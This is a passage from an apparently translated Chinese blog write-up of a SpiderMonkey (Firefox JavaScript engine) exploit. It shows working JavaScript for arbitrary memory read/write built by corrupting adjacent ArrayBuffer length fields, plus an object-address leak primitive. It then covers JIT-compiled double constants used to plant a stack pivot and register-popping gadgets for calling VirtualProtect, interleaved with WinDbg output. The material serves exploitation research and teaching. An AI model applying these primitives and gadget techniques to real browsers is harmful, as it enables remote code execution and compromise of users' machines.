js!js::DispatchTyped&lt;js::TenuringTraversalFunctor&lt;JS::Value&gt;,js::TenuringTracer *&gt;</span><br><span class="line">02 js!js::TenuringTracer::traverse</span><br><span class="line">03 js!js::TenuringTracer::traceSlots</span><br><span class="line">04 js!js::TenuringTracer::traceObject</span><br><span class="line">05 js!js::Nursery::collectToFixedPoint</span><br><span class="line">06 js!js::Nursery::doCollection</span><br><span class="line">07 js!js::Nursery::collect</span><br><span class="line">08 js!js::gc::GCRuntime::minorGC</span><br><span class="line">09 js!js::gc::GCRuntime::tryNewNurseryObject&lt;1&gt;</span><br><span class="line">0a js!js::Allocate&lt;JSObject,1&gt;</span><br><span class="line">0b js!js::ArrayObject::createArrayInternal</span><br><span class="line">0c js!js::ArrayObject::createArray</span><br><span class="line">0d js!NewArray&lt;4294967295&gt;</span><br><span class="line">0e js!NewArrayTryUseGroup&lt;4294967295&gt;</span><br><span class="line">0f js!js::jit::NewArrayWithGroup</span><br><span class="line">10 0x0</span><br></pre></td></tr></table></figure></p>
<p>我忘了两件事：Nursery 用于存放使用周期短的对象，并且没有无限的空间。例如，当它变满时，GC(垃圾回收机制)在该区域上运行以尝试清理。如果其中一些对象仍处于活动状态，则会将它们移动到 Tenured 堆中。当发生这种情况时，对我们来说这是一个错误，因为我们失去了对象之间的相邻性，那就一切都是……错误的。这是我最初设计没有考虑到的一件事，需要修复。</p>
<h3 id="提高内存访问代码的可靠性"><a href="#提高内存访问代码的可靠性" class="headerlink" title="提高内存访问代码的可靠性"></a>提高内存访问代码的可靠性</h3><p>我决定在这里做的很简单：搬到新的空间去。不久我可以读取和写入内存，这还得感谢发生在 Nursery 中的错误。我使用那些代码来破坏在 Tenured 堆中分配的另一组对象。我选择修改 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" title="ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> 对象，因为它们在 Tenured 堆中分配。您可以在构造时将 ArrayBuffer 传递给 TypedArray，TypedArray 为您提供 ArrayBuffer 缓冲区的视图。换句话说，我们仍然可以在内存中读取原始字节，一旦我们重新定义了我们的代码，它就会非常透明。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class ArrayBufferObject : public ArrayBufferObjectMaybeShared</span><br><span class="line">&#123;</span><br><span class="line">  public:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> uint8_t DATA_SLOT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> uint8_t BYTE_LENGTH_SLOT = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> uint8_t FIRST_VIEW_SLOT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> uint8_t FLAGS_SLOT = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>首先要做的是：为了做好准备，我们只需创建两个相邻的 ArrayBuffers （由 js :: ArrayBufferObject 类表示）。<br>然后，我们修改他们的 BYTE_LENGTH_SLOT（偏移+ 0x28）以使缓冲区更大。第一个 ArrayBuffer 用于操纵另一个 ArrayBuffer，用于服务我们的内存访问请求。与 Basic.js 完全相同，这里使用 ArrayBuffers 而不是 TypedArrays 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Let&apos;s move the battlefield to the TenuredHeap</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">const AB1 = new ArrayBuffer(1);</span><br><span class="line">const AB2 = new ArrayBuffer(1);</span><br><span class="line">const AB1Address = Pwn.AddrOf(AB1);</span><br><span class="line">const AB2Address = Pwn.AddrOf(AB2);</span><br><span class="line"></span><br><span class="line">Pwn.Write(</span><br><span class="line">    Add(AB1Address, 0x28),</span><br><span class="line">    [0x00, 0x00, 0x01, 0x00, 0x00, 0x80, 0xf8, 0xff]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Pwn.Write(</span><br><span class="line">    Add(AB2Address, 0x28),</span><br><span class="line">    [0x00, 0x00, 0x01, 0x00, 0x00, 0x80, 0xf8, 0xff]</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>完成后，我们重新定义 Pwn .__ Access 函数以使用我们刚刚创建的 Tenured 对象。它几乎和以前一样工作，但一个不同的细节是后备缓冲区的地址右移 1 位。如果缓冲区位于 0xdeadbeef，则存储在 DATA_SLOT 中的地址将为0xdeadbeef &gt;&gt; 1 = 0x6f56df77 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">js!js::math_atan2:</span><br><span class="line">00007ff7`65362ac0 4056            push    rsi</span><br><span class="line"></span><br><span class="line">0:000&gt; ?? vp[2]</span><br><span class="line">union JS::Value</span><br><span class="line">   +0x000 asBits_          : 0xfffe0207`ba5980a0</span><br><span class="line">   +0x000 asDouble_        : -1.#QNAN </span><br><span class="line">   +0x000 s_               : JS::Value::&lt;unnamed-type-s_&gt;</span><br><span class="line"></span><br><span class="line">0:000&gt; dt js!js::ArrayBufferObject 0x207`ba5980a0</span><br><span class="line">   +0x000 group_           : js::GCPtr&lt;js::ObjectGroup *&gt;</span><br><span class="line">   +0x008 shapeOrExpando_  : 0x00000207`ba5b19e8 Void</span><br><span class="line">   +0x010 slots_           : (null) </span><br><span class="line">   +0x018 elements_        : 0x00007ff7`6597d2e8 js::HeapSlot</span><br><span class="line"></span><br><span class="line">0:000&gt; dqs 0x207`ba5980a0</span><br><span class="line">00000207`ba5980a0  00000207`ba58a8b0</span><br><span class="line">00000207`ba5980a8  00000207`ba5b19e8</span><br><span class="line">00000207`ba5980b0  00000000`00000000</span><br><span class="line">00000207`ba5980b8  00007ff7`6597d2e8 js!emptyElementsHeader+0x10</span><br><span class="line">00000207`ba5980c0  00000103`dd2cc070 &lt;- DATA_SLOT</span><br><span class="line">00000207`ba5980c8  fff88000`00000001 &lt;- BYTE_LENGTH_SLOT</span><br><span class="line">00000207`ba5980d0  fffa0000`00000000 &lt;- FIRST_VIEW_SLOT</span><br><span class="line">00000207`ba5980d8  fff88000`00000000 &lt;- FLAGS_SLOT</span><br><span class="line">00000207`ba5980e0  fffe4d4d`4d4d4d00 &lt;- our backing buffer</span><br><span class="line"></span><br><span class="line">0:000&gt; ? 00000103`dd2cc070 &lt;&lt; 1</span><br><span class="line">Evaluate expression: 2232214454496 = 00000207`ba5980e0</span><br></pre></td></tr></table></figure></p>
<p>上述结果是，由于最后一位丢失，您无法从奇数地址读取。 要解决它，如果我们遇到一个奇数地址，我们从之前的字节读取，我们读取一个额外的字节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Pwn.__Access = function (Addr, LengthOrValues) &#123;</span><br><span class="line">    if(typeof Addr == &apos;string&apos;) &#123;</span><br><span class="line">        Addr = new Int64(Addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const IsRead = typeof LengthOrValues == &apos;number&apos;;</span><br><span class="line">    let Length = LengthOrValues;</span><br><span class="line">    if(!IsRead) &#123;</span><br><span class="line">        Length = LengthOrValues.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let OddOffset = 0;</span><br><span class="line">    if(Addr.byteAt(0) &amp; 0x1) &#123;</span><br><span class="line">        Length += 1;</span><br><span class="line">        OddOffset = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(AB1.byteLength &lt; Length) &#123;</span><br><span class="line">        throw &apos;Error&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // Fix base address</span><br><span class="line">    //</span><br><span class="line"></span><br><span class="line">    Addr = RShift1(Addr);</span><br><span class="line">    const Biggie = new Uint8Array(AB1);</span><br><span class="line">    for(const [Idx, Byte] of Addr.bytes().entries()) &#123;</span><br><span class="line">        Biggie[Idx + 0x40] = Byte;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const View = new Uint8Array(AB2);</span><br><span class="line">    if(IsRead) &#123;</span><br><span class="line">        return View.slice(OddOffset, Length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(const [Idx, Byte] of LengthOrValues.entries()) &#123;</span><br><span class="line">        View[OddOffset + Idx] = Byte;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>重新定义的最后一个代码是 AddrOf 。 对于这个，我只使用了前面提到的技术，我在 <a href="https://github.com/saelo/foxpwn/blob/master/code.js#L442" title="foxpwn" target="_blank" rel="noopener">foxpwn</a> 中使用过。</p>
<p>正如我们在文章的介绍中所讨论的那样，属性值存储在关联的 JSObject 中。当我们在ArrayBuffer上定义一个自定义属性时，它的值存储在 _slots 字段指向的内存中（因为没有足够的空间来内联存储）。这意味着如果我们有两个连续的 ArrayBuffers ，我们可以利用第一个 ArrayBuffer 相对读入第二个 slot_字段，它给出了属性值的地址。然后，我们可以简单地使用我们的任意读取内存代码来读取 js :: Value 并分离几个位以泄漏任意对象的地址。 我们假设以下 JavaScript 代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">js&gt; AB = new ArrayBuffer()</span><br><span class="line">(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">js&gt; AB.doare = 1337</span><br><span class="line">1337</span><br><span class="line"></span><br><span class="line">js&gt; objectAddress(AB)</span><br><span class="line">&quot;0000020156E9A080&quot;</span><br></pre></td></tr></table></figure>
<p>从调试器中我们可以看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:006&gt; dt js::NativeObject 0000020156E9A080</span><br><span class="line">   +0x000 group_           : js::GCPtr&lt;js::ObjectGroup *&gt;</span><br><span class="line">   +0x008 shapeOrExpando_  : 0x00000201`56eb1a88 Void</span><br><span class="line">   +0x010 slots_           : 0x00000201`57153740 js::HeapSlot</span><br><span class="line">   +0x018 elements_        : 0x00007ff7`b48bd2e8 js::HeapSlot</span><br><span class="line"></span><br><span class="line">0:006&gt; dqs 0x00000201`57153740 l1</span><br><span class="line">00000201`57153740  fff88000`00000539 &lt;- 1337</span><br></pre></td></tr></table></figure></p>
<p>所以这正是我们要做的： 在 AB2 上定义一个自定义属性并相对读出 js :: Value 和 boom 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Pwn.AddrOf = function (Obj) &#123;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // Technique from saelo&apos;s foxpwn exploit</span><br><span class="line">    //</span><br><span class="line"></span><br><span class="line">    AB2.hell_on_earth = Obj;</span><br><span class="line">    const SlotsAddressRaw = new Uint8Array(AB1).slice(48, 48 + 8);</span><br><span class="line">    const SlotsAddress = new Int64(SlotsAddressRaw);</span><br><span class="line">    return Int64.fromJSValue(this.Read(SlotsAddress, 8));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190822153330-234aaa24-c4af-1.png" alt="image.png"></p>
<h3 id="动态解析导出的函数地址"><a href="#动态解析导出的函数地址" class="headerlink" title="动态解析导出的函数地址"></a>动态解析导出的函数地址</h3><p>这真的很容易做到。<br>编写的实用程序能够使用用户提供的读取函数，模块基地址，它将遍历其 <a href="http://win32assembly.programminghorizon.com/pe-tut6.html" title="IAT" target="_blank" rel="noopener">IAT</a> 并解析 API 地址。 如果你更感兴趣，你可以阅读 <a href="https://github.com/0vercl0k/blazefox/blob/master/exploits/moarutils.js" title="moarutils.js" target="_blank" rel="noopener">moarutils.js</a> 中的代码，甚至可以重复使用它！</p>
<h3 id="强制-JIt-编译-gadgets：带上你的-gadgets"><a href="#强制-JIt-编译-gadgets：带上你的-gadgets" class="headerlink" title="强制 JIt 编译 gadgets：带上你的 gadgets"></a>强制 JIt 编译 gadgets：带上你的 gadgets</h3><p><a href="https://www.youtube.com/watch?v=Dvi8P-lhJmE" title="All right, all right, all right" target="_blank" rel="noopener">All right, all right, all right</a>，最后，来到了有趣的部分。baseline JIT 的一个好处是没有 Constant <a href="https://en.wikipedia.org/wiki/Blinding_(cryptography" target="_blank" rel="noopener">blinding</a> “blinding”)。这意味着如果我们能够找到一种方法来强制 JIT 引擎编译我们控制的常量函数，我们就可以在内存中制作我们需要的 gadgets 。我们不必依赖外部模块，而且可以更容易地制作出符合我们需求的定制组件。这就是我在 kaizen 漏洞利用中所谓的<a href="https://github.com/0vercl0k/blazefox/blob/master/exploits/kaizen.js#L269" title=" Bring Your Own Gadgets" target="_blank" rel="noopener"> Bring Your Own Gadgets</a>。这不是什么新鲜事，我认为文献中使用的适当术语应是 “ JIT 代码重用 ”。</p>
<p>我能找到的最大类型的常量是 doubles 型，这是我最终关注的（我尝试过其他一些东西）。为了生成具有相同的表示形式而不是任意的 doubles 型数据（如上所述，我们实际上不能表示每 8 个字节值）四字（8字节），我们利用两个TypedArrays 在两个不同的表示中查看相同的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function b2f(A) &#123;</span><br><span class="line">    if(A.length != 8) &#123;</span><br><span class="line">        throw &apos;Needs to be an 8 bytes long array&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const Bytes = new Uint8Array(A);</span><br><span class="line">    const Doubles = new Float64Array(Bytes.buffer);</span><br><span class="line">    return Doubles[0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>例如，我们通过调用 b2f（bytes to float） 生成一个代表 0xdeadbeefbaadc0de 的 double 型数据来启动：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js&gt; b2f([0xde, 0xc0, 0xad, 0xba, 0xef, 0xbe, 0xad, 0xde])</span><br><span class="line">-1.1885958399657559e+148</span><br></pre></td></tr></table></figure></p>
<p>让我们从简单开始，创建一个基本的 JavaScript 函数，将这个常量赋给一堆不同的变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const BringYourOwnGadgets = function () &#123;</span><br><span class="line">    const D = -1.1885958399657559e+148;</span><br><span class="line">    const O = -1.1885958399657559e+148;</span><br><span class="line">    const A = -1.1885958399657559e+148;</span><br><span class="line">    const R = -1.1885958399657559e+148;</span><br><span class="line">    const E = -1.1885958399657559e+148;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>要提示引擎该函数是“热代码”，我们就多次调用它，因此它会被 JIT 编译为机器代码。每次调用函数时，引擎都会调用分析类型的钩子，以便跟踪 “热/冷”代码（以及其他内容）。无论如何，根据我的测试，调用函数十二次会触发 baseline JIT（你还应该知道<a href="无论如何，根据我的测试，调用函数十二次会触发基线JIT（你还应该知道这里记录的onIon和inJit中的魔术函数）：" title="这里">这里</a>记录的 onIon 和 inJit 中的魔术函数）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(let Idx = 0; Idx &lt; 12; Idx++) &#123;</span><br><span class="line">    BringYourOwnGadgets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>支持 JavaScript 函数的 C++ 对象是 JSFunction 。 这是调试器中的样子： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">js!js::math_atan2:</span><br><span class="line">00007ff7`65362ac0 4056            push    rsi</span><br><span class="line"></span><br><span class="line">0:000&gt; ?? vp[2]</span><br><span class="line">union JS::Value</span><br><span class="line">   +0x000 asBits_          : 0xfffe01b8`2ffb0c00</span><br><span class="line">   +0x000 asDouble_        : -1.#QNAN </span><br><span class="line">   +0x000 s_               : JS::Value::&lt;unnamed-type-s_&gt;</span><br><span class="line"></span><br><span class="line">0:000&gt; dt JSFunction 01b82ffb0c00</span><br><span class="line">   +0x000 group_           : js::GCPtr&lt;js::ObjectGroup *&gt;</span><br><span class="line">   +0x008 shapeOrExpando_  : 0x000001b8`2ff8c240 Void</span><br><span class="line">   +0x010 slots_           : (null) </span><br><span class="line">   +0x018 elements_        : 0x00007ff7`6597d2e8 js::HeapSlot</span><br><span class="line">   +0x020 nargs_           : 0</span><br><span class="line">   +0x022 flags_           : 0x143</span><br><span class="line">   +0x028 u                : JSFunction::U</span><br><span class="line">   +0x038 atom_            : js::GCPtr&lt;JSAtom *&gt;</span><br><span class="line"></span><br><span class="line">0:000&gt; dt -r2 JSFunction::U 01b82ffb0c00+28</span><br><span class="line">   +0x000 native           : JSFunction::U::&lt;unnamed-type-native&gt;</span><br><span class="line">      +0x000 func_            : 0x000001b8`2ff8e040        bool  +1b82ff8e040</span><br><span class="line">      +0x008 extra            : JSFunction::U::&lt;unnamed-type-native&gt;::&lt;unnamed-type-extra&gt;</span><br><span class="line">         +0x000 jitInfo_         : 0x000001b8`2ff93420 JSJitInfo</span><br><span class="line">         +0x000 asmJSFuncIndex_  : 0x000001b8`2ff93420</span><br><span class="line">         +0x000 wasmJitEntry_    : 0x000001b8`2ff93420  -&gt; 0x000003ed`90971bf0 Void</span><br></pre></td></tr></table></figure>
<p>从这里我们可以 dump 与我们的函数关联的 JSJitInfo 来获取它在内存中的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt JSJitInfo 0x000001b8`2ff93420</span><br><span class="line">   +0x000 getter           : 0x000003ed`90971bf0     bool  +3ed90971bf0</span><br><span class="line">   +0x000 setter           : 0x000003ed`90971bf0     bool  +3ed90971bf0</span><br><span class="line">   +0x000 method           : 0x000003ed`90971bf0     bool  +3ed90971bf0</span><br><span class="line">   +0x000 staticMethod     : 0x000003ed`90971bf0     bool  +3ed90971bf0</span><br><span class="line">   +0x000 ignoresReturnValueMethod : 0x000003ed`90971bf0     bool  +3ed90971bf0</span><br><span class="line">   +0x008 protoID          : 0x1bf0</span><br><span class="line">   +0x008 inlinableNative  : 0x1bf0 (No matching name)</span><br><span class="line">   +0x00a depth            : 0x9097</span><br><span class="line">   +0x00a nativeOp         : 0x9097</span><br><span class="line">   +0x00c type_            : 0y1101</span><br><span class="line">   +0x00c aliasSet_        : 0y1110</span><br><span class="line">   +0x00c returnType_      : 0y00000011 (0x3)</span><br><span class="line">   +0x00c isInfallible     : 0y0</span><br><span class="line">   +0x00c isMovable        : 0y0</span><br><span class="line">   +0x00c isEliminatable   : 0y0</span><br><span class="line">   +0x00c isAlwaysInSlot   : 0y0</span><br><span class="line">   +0x00c isLazilyCachedInSlot : 0y0</span><br><span class="line">   +0x00c isTypedMethod    : 0y0</span><br><span class="line">   +0x00c slotIndex        : 0y0000000000 (0)</span><br><span class="line"></span><br><span class="line">0:000&gt; !address 0x000003ed`90971bf0</span><br><span class="line">Usage:                  &lt;unknown&gt;</span><br><span class="line">Base Address:           000003ed`90950000</span><br><span class="line">End Address:            000003ed`90980000</span><br><span class="line">Region Size:            00000000`00030000 ( 192.000 kB)</span><br><span class="line">Protect:                00000020          PAGE_EXECUTE_READ</span><br><span class="line">Allocation Base:        000003ed`90950000</span><br><span class="line">Allocation Protect:     00000001          PAGE_NOACCESS</span><br></pre></td></tr></table></figure></p>
<p>看起来还不错：0x000001b82ff93420 指针指向一个 192kB 区域，该区域被分配为 PAGE_NOACCESS 但现在既可执行又可读。<br>在这一点上，我主要观察这些而不是阅读一堆代码。即便这可能会更容易些，我真的想坐下来了解一下（至少比我现在做的更多:)。所以我开始从 0x000003ed90971bf0 开始 dump 出大量指令并向下滚动，希望在反汇编中找到一些常量。这不是我给你的最科学的方法，但看看我最终发现了什么：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 000003ed`90971c18 l200</span><br><span class="line">[...]</span><br><span class="line">000003ed`90972578 49bbdec0adbaefbeadde mov r11,0DEADBEEFBAADC0DEh</span><br><span class="line">000003ed`90972582 4c895dc8        mov     qword ptr [rbp-38h],r11</span><br><span class="line">000003ed`90972586 49bbdec0adbaefbeadde mov r11,0DEADBEEFBAADC0DEh</span><br><span class="line">000003ed`90972590 4c895dc0        mov     qword ptr [rbp-40h],r11</span><br><span class="line">000003ed`90972594 49bbdec0adbaefbeadde mov r11,0DEADBEEFBAADC0DEh</span><br><span class="line">000003ed`9097259e 4c895db8        mov     qword ptr [rbp-48h],r11</span><br><span class="line">000003ed`909725a2 49bbdec0adbaefbeadde mov r11,0DEADBEEFBAADC0DEh</span><br><span class="line">000003ed`909725ac 4c895db0        mov     qword ptr [rbp-50h],r11</span><br><span class="line">000003ed`909725b0 49bbdec0adbaefbeadde mov r11,0DEADBEEFBAADC0DEh</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>看起来很熟悉呃？ 这是我们在上面定义的 JavaScript 函数中分配的四个八字节常量。这非常好，因为这意味着我们可以使用它们在内存中植入和制造小型  gadgets （记住我们有8个字节）（在我们可以在运行时找到的位置）。<br>我需要的最基础的2个 gadgets:</p>
<ul>
<li>stack-pivot 执行类似 xchg rsp，rdx / mov rsp，qword ptr [rsp] / mov rsp，qword [rsp + 38h] / ret的操作，</li>
<li>根据 Microsoft x64 调用约定从堆栈中弹出四个四字的 gadgets，可以调用带有任意参数的kernel32！VirtualProtect。</li>
</ul>
<p>第二点很容易。 这一系列的指令 pop rcx / pop rdx / pop r8 / pop r9 / ret 占用了7个字节，非常适合 double 型数据。 我们看下一个。<br>第一个是有点棘手的，因为一旦组装完的指令序列需要超过 double 型才能适合。它长 12 个字节。那很糟糕。 现在，如果我们考虑 JIT 列出指令和常量的方式，我们可以轻松地将一段代码分支到第二个代码。让我们说另一个常量，我们可以使用另外八个字节。你可以用两个字节短的 jmp 轻松实现这一点。这意味着我们有 6 个字节用于有用的代码，两个字节用于 jmp 到下一个部分。在上述约束条件下，我决定将序列分成三个，然后用两个跳转连接起来。第一条指令 xchg rsp，rdx 需要三个字节，第二条指令需要移动 rsp，qword ptr [rsp] 需要四个字节。我们没有足够的空间让它们都在同一个常数上，所以我们用 NOP 填充第一个常量并在末尾放置一个短的 jmp +6 。第三条指令长度为五个字节，因此我们不能将第二条和第三条指令放在同一个常量上。再次，我们自己填充第二个，并使用短的 jmp +6 分支到第三个部分。第四个指令 ret 只有一个字节，因此我们可以将第三个和第四个指令组合在同一个常数上。<br>最终我们得到了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const BringYourOwnGadgets = function () &#123;</span><br><span class="line">    const PopRegisters = -6.380930795567661e-228;</span><br><span class="line">    const Pivot0 = 2.4879826032820723e-275;</span><br><span class="line">    const Pivot1 = 2.487982018260472e-275;</span><br><span class="line">    const Pivot2 = -6.910095487116115e-229;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一旦函数被 JIT 编译后，让我们去调试器中确认下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; ?? vp[2]</span><br><span class="line">union JS::Value</span><br><span class="line">   +0x000 asBits_          : 0xfffe01dc`e19b0680</span><br><span class="line">   +0x000 asDouble_        : -1.#QNAN </span><br><span class="line">   +0x000 s_               : JS::Value::&lt;unnamed-type-s_&gt;</span><br><span class="line"></span><br><span class="line">0:000&gt; dt -r2 JSFunction::U 1dc`e19b0680+28</span><br><span class="line">   +0x000 native           : JSFunction::U::&lt;unnamed-type-native&gt;</span><br><span class="line">      +0x000 func_            : 0x000001dc`e198e040        bool  +1dce198e040</span><br><span class="line">      +0x008 extra            : JSFunction::U::&lt;unnamed-type-native&gt;::&lt;unnamed-type-extra&gt;</span><br><span class="line">         +0x000 jitInfo_         : 0x000001dc`e1993258 JSJitInfo</span><br><span class="line">         +0x000 asmJSFuncIndex_  : 0x000001dc`e1993258</span><br><span class="line">         +0x000 wasmJitEntry_    : 0x000001dc`e1993258  -&gt; 0x0000015d`e28a1bf0 